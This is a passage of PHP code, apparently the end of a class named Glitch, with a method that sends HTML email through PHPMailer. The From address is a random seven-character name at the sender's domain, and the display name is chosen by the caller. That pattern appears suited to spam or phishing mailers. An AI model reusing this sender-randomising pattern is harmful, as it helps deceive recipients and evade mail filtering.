    public function send($to, $subject, $message, $from = '') {
    require __DIR__ . '/system/class/smtp.php';
    require __DIR__ . '/system/class/phpmailer.php';
    $mail = new PHPMailer(true);
    $fromemail = explode("@", $this->config("smtp_user"));
    if ($this->config("sending") == "smtp") {
        $mail->isSMTP();
        $mail->SMTPAuth = true;
        $mail->Host = $this->config("smtp_host");
        $mail->Port = $this->config("smtp_port");
        $mail->Username = $this->config("smtp_user");
        $mail->Password = $this->config("smtp_pass");
        $mail->SMTPSecure = $this->config("smtp_secure");
    } else {
           $mail->isMail();
    }
    $mail->isHTML(true);
    $mail->CharSet = "UTF-8";
    $mail->setFrom(substr($this->RANDOM(), 0, 7) . "@" . $fromemail[1], strtoupper($from));
    $mail->Subject = $subject;
    $mail->Body = $message;
    $mail->addAddress($to);
    $mail->send();
 	}
}
$api = new Glitch;
?>